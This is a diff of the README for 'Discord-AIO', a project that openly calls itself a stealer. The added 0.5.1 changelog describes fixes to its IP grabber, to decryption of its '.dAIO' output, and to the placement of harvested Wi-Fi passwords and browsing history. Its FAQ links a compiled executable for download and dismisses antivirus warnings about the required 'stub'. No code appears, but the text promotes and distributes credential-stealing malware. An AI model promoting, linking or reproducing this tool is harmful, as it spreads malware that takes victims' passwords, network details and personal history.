@@ -151,6 +151,16 @@ I will not be held accountable for any illegal activities.
 - Do not support ip check
 
 <div align="center">
+  
+**0.5.1**
+  
+</div>
+
+- Fixed not working issue (ip grabber)
+- After decryption .dAIO remains decrypted (you don't need to check it again in program)
+- Fixed that Wi-Fi passwords and the history sections were not right placed
+
+<div align="center">
 
 ## FAQ
 
@@ -163,7 +173,7 @@ Yes, the program is 100% free and open source.
 On Null Community [discord](https://discord.gg/qjrDprutvg).
 
 - How to use it?<br />
-You need to compile open source files or download released stable program from [here](https://github.com/Nyxonn/Discord-AIO/releases/download/0.5.0/Discord.AIO.exe) or discord above.
+You need to compile open source files or download released stable program from [here](https://github.com/Nyxonn/Discord-AIO/releases/download/0.5.1/Discord.AIO.exe) or discord above.
 
 - Antivirus reports program as malicious!<br />
 Program contains the stub file which is necessary to make stealer work, it's all open source so if you are extremly scared check it by yourself.
